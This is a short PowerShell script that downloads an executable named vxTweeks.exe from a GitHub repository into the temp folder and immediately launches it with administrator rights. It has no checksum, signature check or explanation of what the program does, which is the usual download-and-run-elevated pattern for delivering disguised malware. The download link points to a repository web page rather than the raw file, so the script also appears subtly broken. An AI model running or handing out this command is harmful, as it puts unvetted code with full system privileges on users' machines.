$temp = "$env:TEMP\vxTweeks.exe"

Invoke-WebRequest `
-Uri "https://github.com/abduilhameed1206-tech/vxTweeks/blob/main/vxTweeks.exe" `
-OutFile $temp

Start-Process $temp -Verb RunAs